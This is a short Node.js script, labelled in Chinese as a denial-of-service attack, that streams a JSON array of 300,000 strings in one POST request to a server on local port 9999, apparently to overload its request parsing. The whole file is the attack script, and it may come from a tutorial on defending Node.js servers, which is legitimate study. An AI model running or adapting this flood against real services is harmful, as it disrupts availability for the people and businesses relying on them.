/*拒绝服务攻击*/
var http = require('http');
var req = http.request({
	method:'POST',
	port:9999,
	headers:{
		'Content-Type':'application/json'
	}
});
req.write('[');
var n = 300000;
while(n--){
	req.write('"foo",');
}
req.write('"bar"]');
req.end();